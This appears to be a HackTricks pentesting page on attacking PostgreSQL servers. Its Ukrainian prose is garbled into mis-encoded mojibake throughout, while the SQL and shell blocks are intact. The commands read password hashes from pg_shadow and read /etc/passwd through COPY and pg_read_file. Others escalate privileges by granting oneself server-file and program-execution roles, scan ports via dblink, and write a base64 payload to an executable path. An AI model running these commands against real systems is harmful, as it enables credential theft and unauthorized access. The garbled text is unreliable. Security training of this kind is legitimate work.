# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) –¥–ª—è –ª–µ–≥–∫–æ–≥–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤**, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–∏—Ö **–Ω–∞–π—Å—É—á–∞—Å–Ω—ñ—à–∏–º–∏** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

**PostgreSQL** –æ–ø–∏—Å—É—î—Ç—å—Å—è —è–∫ **–æ–±'—î–∫—Ç–Ω–æ-—Ä–µ–ª—è—Ü—ñ–π–Ω–∞ —Å–∏—Å—Ç–µ–º–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–∞–∑–∞–º–∏ –¥–∞–Ω–∏—Ö**, —è–∫–∞ —î **–≤—ñ–¥–∫—Ä–∏—Ç–∏–º –∫–æ–¥–æ–º**. –¶—è —Å–∏—Å—Ç–µ–º–∞ –Ω–µ –ª–∏—à–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –º–æ–≤—É SQL, –∞–ª–µ –π –ø–æ–∫—Ä–∞—â—É—î —ó—ó –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏. –á—ó –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –æ–±—Ä–æ–±–ª—è—Ç–∏ —à–∏—Ä–æ–∫–∏–π —Å–ø–µ–∫—Ç—Ä —Ç–∏–ø—ñ–≤ –¥–∞–Ω–∏—Ö —Ç–∞ –æ–ø–µ—Ä–∞—Ü—ñ–π, —â–æ —Ä–æ–±–∏—Ç—å —ó—ó —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∏–º –≤–∏–±–æ—Ä–æ–º –¥–ª—è —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤ —Ç–∞ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 5432, —ñ —è–∫—â–æ —Ü–µ–π –ø–æ—Ä—Ç –≤–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è, —Ç–æ, –∑–¥–∞—î—Ç—å—Å—è, postgresql –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø–æ—Ä—Ç (–π–º–æ–≤—ñ—Ä–Ω–æ, 5433), —è–∫–∏–π –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ç–∞ –±–∞–∑–æ–≤–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
–Ø–∫—â–æ –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ **`\list`** –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±–∞–∑—É –¥–∞–Ω–∏—Ö –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`rdsadmin`**, –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ –≤–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **AWS postgresql database**.
{% endhint %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ **—è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ PostgreSQL –±–∞–∑–æ—é –¥–∞–Ω–∏—Ö** –¥–∏–≤—ñ—Ç—å—Å—è:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **–°–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤**

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü–∏–º –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è–º**](https://www.exploit-db.com/papers/13084), –∫–æ–ª–∏ —Å–ø—Ä–æ–±–∞ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –Ω–µ –≤–¥–∞—î—Ç—å—Å—è, `dblink` –≤–∏–∫–∏–¥–∞—î –≤–∏–∫–ª—é—á–µ–Ω–Ω—è `sqlclient_unable_to_establish_sqlconnection`, —è–∫–µ –º—ñ—Å—Ç–∏—Ç—å –ø–æ—è—Å–Ω–µ–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏. –ü—Ä–∏–∫–ª–∞–¥–∏ —Ü–∏—Ö –¥–µ—Ç–∞–ª–µ–π –Ω–∞–≤–µ–¥–µ–Ω—ñ –Ω–∏–∂—á–µ.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* –•–æ—Å—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π

`–î–ï–¢–ê–õ–Ü: –Ω–µ –≤–¥–∞–ª–æ—Å—è –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ —Å–µ—Ä–≤–µ—Ä–∞: –ù–µ–º–∞—î –º–∞—Ä—à—Ä—É—Ç—É –¥–æ —Ö–æ—Å—Ç–∞. –ß–∏ –ø—Ä–∞—Ü—é—î —Å–µ—Ä–≤–µ—Ä –Ω–∞ —Ö–æ—Å—Ç—ñ "1.2.3.4" —ñ –ø—Ä–∏–π–º–∞—î TCP/IP –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É 5678?`

* –ü–æ—Ä—Ç –∑–∞–∫—Ä–∏—Ç–∏–π
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* –ü–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
or
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* –ü–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∞–±–æ —Ñ—ñ–ª—å—Ç—Ä—É—î—Ç—å—Å—è
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
–£ —Ñ—É–Ω–∫—Ü—ñ—è—Ö PL/pgSQL –Ω–∞—Ä–∞–∑—ñ –Ω–µ–º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—Ç–∞–ª—ñ –≤–∏–∫–ª—é—á–µ–Ω—å. –û–¥–Ω–∞–∫, —è–∫—â–æ —É –≤–∞—Å —î –ø—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ PostgreSQL, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –Ø–∫—â–æ –≤–∏—Ç—è–≥—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ –∑ —Å–∏—Å—Ç–µ–º–Ω–∏—Ö —Ç–∞–±–ª–∏—Ü—å –Ω–µ–º–æ–∂–ª–∏–≤–æ, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑–≥–ª—è–Ω—É—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ç–æ–¥—É –∞—Ç–∞–∫–∏ –∑—ñ —Å–ª–æ–≤–Ω–∏–∫–æ–º, –æ–±–≥–æ–≤–æ—Ä–µ–Ω–æ–≥–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –º–æ–∂–µ –¥–∞—Ç–∏ –ø–æ–∑–∏—Ç–∏–≤–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏.

## –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è –ü—Ä–∏–≤—ñ–ª–µ—ó–≤

### –†–æ–ª—ñ

| –¢–∏–ø–∏ –†–æ–ª–µ–π     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | –†–æ–ª—å –º–∞—î –ø—Ä–∏–≤—ñ–ª–µ—ó —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞                                                                                                                |
| rolinherit     | –†–æ–ª—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —É—Å–ø–∞–¥–∫–æ–≤—É—î –ø—Ä–∏–≤—ñ–ª–µ—ó —Ä–æ–ª–µ–π, —á–ª–µ–Ω–æ–º —è–∫–∏—Ö –≤–æ–Ω–∞ —î                                                                                     |
| rolcreaterole  | –†–æ–ª—å –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –±—ñ–ª—å—à–µ —Ä–æ–ª–µ–π                                                                                                                  |
| rolcreatedb    | –†–æ–ª—å –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö                                                                                                                   |
| rolcanlogin    | –†–æ–ª—å –º–æ–∂–µ —É–≤—ñ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É. –¢–æ–±—Ç–æ, —Ü—é —Ä–æ–ª—å –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —è–∫ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó —Å–µ—Å—ñ—ó                                     |
| rolreplication | –†–æ–ª—å —î —Ä–æ–ª–ª—é —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó. –†–æ–ª—å —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó –º–æ–∂–µ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ –∑'—î–¥–Ω–∞–Ω–Ω—è —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —ñ –≤–∏–¥–∞–ª—è—Ç–∏ —Å–ª–æ—Ç–∏ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó.                          |
| rolconnlimit   | –î–ª—è —Ä–æ–ª–µ–π, —è–∫—ñ –º–æ–∂—É—Ç—å —É–≤—ñ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É, —Ü–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –æ–¥–Ω–æ—á–∞—Å–Ω–∏—Ö –∑'—î–¥–Ω–∞–Ω—å, —è–∫—ñ –º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü—è —Ä–æ–ª—å. -1 –æ–∑–Ω–∞—á–∞—î –±–µ–∑ –æ–±–º–µ–∂–µ–Ω—å. |
| rolpassword    | –ù–µ –ø–∞—Ä–æ–ª—å (–∑–∞–≤–∂–¥–∏ —á–∏—Ç–∞—î—Ç—å—Å—è —è–∫ `********`)                                                                                                         |
| rolvaliduntil  | –ß–∞—Å –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó –ø–∞—Ä–æ–ª—è (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –ø–∞—Ä–æ–ª–µ–º); null, —è–∫—â–æ –Ω–µ–º–∞—î —Ç–µ—Ä–º—ñ–Ω—É –¥—ñ—ó                           |
| rolbypassrls   | –†–æ–ª—å –æ–±—Ö–æ–¥–∏—Ç—å –∫–æ–∂–Ω—É –ø–æ–ª—ñ—Ç–∏–∫—É –±–µ–∑–ø–µ–∫–∏ –Ω–∞ —Ä—ñ–≤–Ω—ñ —Ä—è–¥–∫–∞, –¥–∏–≤. [–†–æ–∑–¥—ñ–ª 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó. |
| rolconfig      | –°–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è —Ä–æ–ª—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è –∑–º—ñ–Ω–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è                                                          |
| oid            | ID —Ä–æ–ª—ñ                                                                                                                                           |

#### –¶—ñ–∫–∞–≤—ñ –ì—Ä—É–ø–∏

* –Ø–∫—â–æ –≤–∏ —î —á–ª–µ–Ω–æ–º **`pg_execute_server_program`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏** –ø—Ä–æ–≥—Ä–∞–º–∏
* –Ø–∫—â–æ –≤–∏ —î —á–ª–µ–Ω–æ–º **`pg_read_server_files`**, –≤–∏ –º–æ–∂–µ—Ç–µ **—á–∏—Ç–∞—Ç–∏** —Ñ–∞–π–ª–∏
* –Ø–∫—â–æ –≤–∏ —î —á–ª–µ–Ω–æ–º **`pg_write_server_files`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–∏—Å–∞—Ç–∏** —Ñ–∞–π–ª–∏

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ Postgres **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á**, **–≥—Ä—É–ø–∞** —Ç–∞ **—Ä–æ–ª—å** —î **–æ–¥–Ω–∏–º —ñ —Ç–∏–º –∂–µ**. –¶–µ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ **—Ç–æ–≥–æ, —è–∫ –≤–∏ —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ** —ñ —á–∏ **–¥–æ–∑–≤–æ–ª—è—î—Ç–µ —ó–π –≤—Ö–æ–¥–∏—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### –¢–∞–±–ª–∏—Ü—ñ
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### –§—É–Ω–∫—Ü—ñ—ó
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## File-system actions

### Read directories and files

–ó —Ü—å–æ–≥–æ [**–∫–æ–º—ñ—Ç—É**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) —á–ª–µ–Ω–∏ –≤–∏–∑–Ω–∞—á–µ–Ω–æ—ó **`DEFAULT_ROLE_READ_SERVER_FILES`** –≥—Ä—É–ø–∏ (–Ω–∞–∑–≤–∞–Ω–æ—ó **`pg_read_server_files`**) —Ç–∞ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ—Ç–æ–¥ **`COPY`** –Ω–∞ –±—É–¥—å-—è–∫–æ–º—É —à–ª—è—Ö—É (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ `convert_and_check_filename` —É `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ –≤–∏ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∞–ª–µ –º–∞—î—Ç–µ –ø—Ä–∞–≤–∞ **CREATEROLE**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ —Ü—å–æ–≥–æ –≥—Ä—É–ø–∏:**
```sql
GRANT pg_read_server_files TO username;
```
[**–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

–Ü—Å–Ω—É—é—Ç—å **—ñ–Ω—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó postgres**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **—á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ –∞–±–æ –ø–µ—Ä–µ–ª—ñ–∫—É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π**. –¢—ñ–ª—å–∫–∏ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ —è–≤–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏** –º–æ–∂—É—Ç—å —ó—Ö –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–±—ñ–ª—å—à–µ —Ñ—É–Ω–∫—Ü—ñ–π** –≤ [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### –ü—Ä–æ—Å—Ç–µ –∑–∞–ø–∏—Å—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–¢—ñ–ª—å–∫–∏ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ —á–ª–µ–Ω–∏ **`pg_write_server_files`** –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ copy –¥–ª—è –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—ñ–≤.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ –≤–∏ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∞–ª–µ –º–∞—î—Ç–µ –ø—Ä–∞–≤–∞ **`CREATEROLE`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏:**
```sql
GRANT pg_write_server_files TO username;
```
[**–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ COPY –Ω–µ –º–æ–∂–µ –æ–±—Ä–æ–±–ª—è—Ç–∏ —Å–∏–º–≤–æ–ª–∏ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è base64, **–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –æ–¥–Ω–æ—Ä—è–¥–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç**.\
–î—É–∂–µ –≤–∞–∂–ª–∏–≤–µ –æ–±–º–µ–∂–µ–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ **`copy` –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∑–∞–ø–∏—Å—É –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –∑–º—ñ–Ω—é—î –¥–µ—è–∫—ñ –±—ñ–Ω–∞—Ä–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è.**

### **–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤**

–û–¥–Ω–∞–∫ —ñ—Å–Ω—É—é—Ç—å **—ñ–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤–µ–ª–∏–∫–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

